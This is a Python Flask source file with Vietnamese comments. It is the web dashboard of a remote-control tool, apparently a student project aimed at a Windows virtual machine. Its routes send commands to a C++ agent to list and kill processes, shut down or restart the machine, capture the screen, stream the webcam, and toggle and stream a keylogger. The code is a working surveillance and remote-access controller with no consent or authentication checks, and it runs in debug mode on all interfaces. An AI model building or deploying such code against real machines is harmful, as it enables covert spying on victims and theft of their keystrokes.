import socket
import struct
import time
import json
import threading
try:
    from flask import Flask, render_template, request, jsonify, Response
    FLASK_AVAILABLE = True
except Exception:
    # Flask not available: provide lightweight stubs so the module can be
    # imported / linted without raising ImportError. Runtime behavior of the
    # web server will require installing Flask (pip install flask).
    FLASK_AVAILABLE = False

    class _DummyApp:
        def route(self, *args, **kwargs):
            def decorator(f):
                return f
            return decorator
        def run(self, *args, **kwargs): 
            print("Flask is not installed. To run the web server, install Flask: pip install flask")

    def render_template(*args, **kwargs):
        return "Flask not installed. Install Flask (pip install flask) to render templates."

    class _DummyRequest:
        @property
        def json(self):
            return {}

    request = _DummyRequest()

    def jsonify(obj=None, **kwargs):
        # Return a JSON string to avoid depending on Flask Response object
        try:
            return json.dumps(obj if obj is not None else {})
        except Exception:
            return json.dumps({"error": "unable to jsonify"})

    def Response(*args, **kwargs):
        raise RuntimeError("Flask is not installed. Install with: pip install flask")

    Flask = lambda *args, **kwargs: _DummyApp()

app = Flask(__name__) if FLASK_AVAILABLE else Flask()

# --- CẤU HÌNH KẾT NỐI ---
# ĐỔI IP NÀY THÀNH IP CỦA MÁY ẢO WINDOWS (Xem bằng ipconfig trên máy ảo)
VM_IP = "192.168.1.15" 

# Cổng phải khớp với file constants.h trong C++
COMMAND_PORT = 8888
DATA_PORT = 8889
LIVESTREAM_PORT = 8890
KEYLOG_PORT = 8891

# Định dạng gói tin Header C++ (24 bytes)
# H: uint16, I: uint32
HEADER_FORMAT = '=HHIIIII'
HEADER_SIZE = 24

def send_command_packet(cmd_str):
    """Gửi lệnh ngắn tới Server C++"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3) # Timeout 3s
            s.connect((VM_IP, COMMAND_PORT))
            s.sendall(cmd_str.encode())
            # Nhận phản hồi ACK từ Server
            try:
                response = s.recv(4096).decode('utf-8', errors='ignore')
                return response.strip()
            except socket.timeout:
                return "Command sent (No ACK)"
    except Exception as e:
        print(f"Lỗi gửi lệnh '{cmd_str}': {e}")
        return f"Error: {str(e)}"

def receive_large_data(trigger_cmd):
    """Gửi lệnh và nhận dữ liệu lớn (CSV, Ảnh) từ cổng Data"""
    try:
        # B1: Gửi lệnh kích hoạt qua cổng Command
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as cmd_sock:
            cmd_sock.connect((VM_IP, COMMAND_PORT))
            cmd_sock.sendall(trigger_cmd.encode())
            # Chờ server xử lý và đẩy dữ liệu sang cổng Data
            time.sleep(0.2) 

        # B2: Kết nối cổng Data để nhận
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as data_sock:
            data_sock.connect((VM_IP, DATA_PORT))
            data_sock.settimeout(15) # Timeout dài cho file lớn
            
            full_payload = bytearray()
            
            while True:
                # 1. Đọc Header
                header_data = data_sock.recv(HEADER_SIZE)
                if not header_data or len(header_data) < HEADER_SIZE:
                    break
                
                # Giải mã Header
                cmd, res, total, curr, size, total_size, checksum = struct.unpack(HEADER_FORMAT, header_data)
                
                # 2. Đọc dữ liệu (Chunk)
                chunk_data = b''
                while len(chunk_data) < size:
                    packet = data_sock.recv(size - len(chunk_data))
                    if not packet: break
                    chunk_data += packet
                
                full_payload.extend(chunk_data)
                
                # Kiểm tra xem đã hết gói chưa
                if curr >= total - 1:
                    break
                    
            return full_payload
    except Exception as e:
        print(f"Lỗi nhận dữ liệu: {e}")
        return None

# --- API ROUTES ---

@app.route('/')
def index():
    return render_template('dashboard.html', target_ip=VM_IP)

@app.route('/api/ping')
def ping():
    """Kiểm tra kết nối tới Server"""
    res = send_command_packet("PING") # Cần đảm bảo C++ xử lý lệnh rác không bị crash
    if "Error" not in res:
        return jsonify({'status': 'online'})
    return jsonify({'status': 'offline'})

@app.route('/api/list/<type>')
def list_items(type):
    """Lấy danh sách Process hoặc App"""
    cmd = "PROCESS_LIST" if type == 'processes' else "APP_LIST"
    raw_data = receive_large_data(cmd)
    
    if not raw_data: 
        return jsonify([])

    try:
        text = raw_data.decode('utf-8', errors='ignore')
        lines = text.split('\n')
        data = []
        
        # Parse CSV thủ công
        for line in lines[1:]: # Bỏ dòng header
            parts = line.split(',')
            if type == 'processes' and len(parts) >= 5:
                data.append({
                    'name': parts[0].strip('"'),
                    'pid': parts[1].strip('"'),
                    'ram': parts[4].strip('"')
                })
            elif type == 'apps' and len(parts) >= 4:
                data.append({
                    'name': parts[1].strip('"'),
                    'ver': parts[2].strip('"'),
                    'loc': parts[3].strip('"')
                })
        return jsonify(data)
    except Exception as e:
        print(f"Parse error: {e}")
        return jsonify([])

@app.route('/api/control', methods=['POST'])
def control_action():
    """Xử lý các lệnh Start/Stop/Power"""
    req = request.json
    action = req.get('action') # START, STOP, SHUTDOWN, RESTART
    target = req.get('target', '') # PID hoặc Path
    
    cmd_str = action
    if target:
        cmd_str = f"{action} {target}"
        
    resp = send_command_packet(cmd_str)
    return jsonify({'response': resp})

@app.route('/api/screenshot')
def screenshot():
    """Chụp màn hình"""
    img_bytes = receive_large_data("SCREEN_CAPTURE")
    if img_bytes:
        return Response(img_bytes, mimetype='image/jpeg')
    return "Error capturing screen", 500

# --- WEBCAM STREAMING (MJPEG) ---
def webcam_stream():
    # Gửi lệnh bật cam
    send_command_packet("LIVESTREAM")
    time.sleep(1) 
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((VM_IP, LIVESTREAM_PORT))
        
        while True:
            # Giao thức Livestream C++: [4 bytes size] + [JPEG Data]
            size_data = sock.recv(4)
            if not size_data: break
            
            size = struct.unpack('i', size_data)[0]
            if size > 10000000: continue # Bỏ qua nếu gói tin quá lớn (lỗi)
            
            img_data = b''
            while len(img_data) < size:
                packet = sock.recv(size - len(img_data))
                if not packet: break
                img_data += packet
                
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + img_data + b'\r\n')
    except Exception as e:
        print(f"Webcam Error: {e}")

@app.route('/video_feed')
def video_feed():
    return Response(webcam_stream(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/api/webcam/off', methods=['POST'])
def webcam_off():
    send_command_packet("STOPLIVESTREAM")
    return jsonify({'status': 'stopped'})

# --- KEYLOGGER STREAMING (SSE) ---
@app.route('/api/keylog/toggle', methods=['POST'])
def keylog_toggle():
    state = request.json.get('state')
    cmd = "KEYLOG" if state else "STOPKEYLOG"
    send_command_packet(cmd)
    return jsonify({'status': 'ok'})

@app.route('/stream/keylog')
def stream_keys():
    def events():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.settimeout(None)
            sock.connect((VM_IP, KEYLOG_PORT))
            while True:
                data = sock.recv(1024)
                if not data: break
                yield f"data: {data.decode()}\n\n"
        except:
            yield "data: [Disconnected]\n\n"
        finally:
            sock.close()
    return Response(events(), mimetype="text/event-stream")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=True)